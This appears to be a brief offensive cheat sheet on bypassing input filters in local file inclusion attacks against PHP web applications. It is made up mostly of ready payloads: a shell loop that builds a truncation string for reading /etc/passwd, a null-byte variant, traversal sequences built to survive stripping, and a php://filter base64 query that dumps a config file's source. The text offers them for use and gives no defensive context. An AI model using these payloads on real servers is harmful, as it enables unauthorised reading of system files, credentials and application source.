**BYPASSING FILTERS**

If a server url gets truncated due to long characters, you can create a long string after your payload and hope for the truncation.
```CLI
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```


PHP 5.5 and older was vulnerable to NULL bytes, %00 at the end. The Null byte told server to ignore everything after
```
/etc/passwd%00
```


Add several dots or slashes that will get stripped

`....////....//....//`
`........//////`
`..\/`


Adding base64 encoding filter to the LFI could print out the source code in b64. The config below is the php file we want code from and the LFO starts at php://filter

`?language=php://filter/read=convert.base64-encode/resource=config`